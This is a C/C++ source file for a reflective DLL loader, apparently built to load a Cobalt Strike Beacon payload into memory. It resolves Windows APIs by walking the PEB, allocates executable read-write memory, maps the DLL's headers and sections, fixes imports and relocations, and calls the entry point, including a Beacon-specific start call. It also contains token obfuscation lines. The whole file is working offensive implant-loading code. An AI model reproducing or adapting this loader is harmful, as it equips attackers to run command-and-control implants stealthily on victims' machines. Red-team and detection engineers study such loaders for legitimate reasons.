#include "ReflectiveLoader.h"
#include "End.h"
#include "Utils.h"
#include "FunctionResolving.h"
#include "StdLib.h"
#include "BeaconUserData.h"
#include "TrackMemory.h"

extern "C" {
#pragma code_seg(".text$a")
    ULONG_PTR __cdecl ReflectiveLoader() {
        volatile int obf1 = 0x1337;
        volatile int obf2 = 0x8BEF;
        obf1 ^= obf2;
        
#ifdef _WIN64
        void* loaderStart = &ReflectiveLoader;
#elif _WIN32
        void* loaderStart = (char*)GetLocation() - 0xE;
#endif
        PRINT("[+] Loader Base Address: %p\n", loaderStart);

#ifdef _STEPHEN_FEWER
        ULONG_PTR rawDllBaseAddress = FindBufferBaseAddressStephenFewer();
#else
        ULONG_PTR rawDllBaseAddress = FindBufferBaseAddress();
#endif
        PRINT("[+] Raw DLL Base Address: %p\n", rawDllBaseAddress);

        PIMAGE_DOS_HEADER rawDllDosHeader = (PIMAGE_DOS_HEADER)rawDllBaseAddress;
        PIMAGE_NT_HEADERS rawDllNtHeader = (PIMAGE_NT_HEADERS)(rawDllBaseAddress + rawDllDosHeader->e_lfanew);

        _PPEB pebAddress = GetPEBAddress();
        WINDOWSAPIS winApi = { 0 };
        if (!ResolveBaseLoaderFunctions(pebAddress, &winApi)) {
            PRINT("[-] Failed to resolve base loader functions\n");
            return NULL;
        }

        if (!winApi.VirtualAlloc) {
            PRINT("[-] VirtualAlloc not resolved\n");
            return NULL;
        }
        if (!winApi.NtFlushInstructionCache) {
            PRINT("[-] NtFlushInstructionCache not resolved\n");
            return NULL;
        }

        ULONG_PTR loadedDllBaseAddress = (ULONG_PTR)winApi.VirtualAlloc(NULL, rawDllNtHeader->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (loadedDllBaseAddress == NULL) {
            PRINT("[-] Failed to allocate memory. Exiting..\n");
            return NULL;
        }
        else {
            PRINT("[+] Allocated memory: 0x%p\n", loadedDllBaseAddress);
        }

        if (!CopyPEHeader(rawDllBaseAddress, loadedDllBaseAddress)) {
            PRINT("[-] Failed to copy PE header. Exiting..\n");
            return NULL;
        };
        if (!CopyPESections(rawDllBaseAddress, loadedDllBaseAddress)) {
            PRINT("[-] Failed to copy PE sections. Exiting..\n");
            return NULL;
        };

        ResolveImports(rawDllNtHeader, loadedDllBaseAddress, &winApi);

        ProcessRelocations(rawDllNtHeader, loadedDllBaseAddress);

        ULONG_PTR entryPoint = loadedDllBaseAddress + rawDllNtHeader->OptionalHeader.AddressOfEntryPoint;
        PRINT("[+] Entry point: %p \n", entryPoint);

        winApi.NtFlushInstructionCache((HANDLE)-1, NULL, 0);

        PRINT("[*] Calling the entry point (DLL_PROCESS_ATTACH) \n");
        ((DLLMAIN)entryPoint)((HINSTANCE)loadedDllBaseAddress, DLL_PROCESS_ATTACH, NULL);
        PRINT("[*] Calling the entry point (DLL_BEACON_START) \n");
        ((DLLMAIN)entryPoint)((HINSTANCE)loaderStart, 0x4, NULL);

        return entryPoint;
    }
}

#pragma code_seg(".text$b")
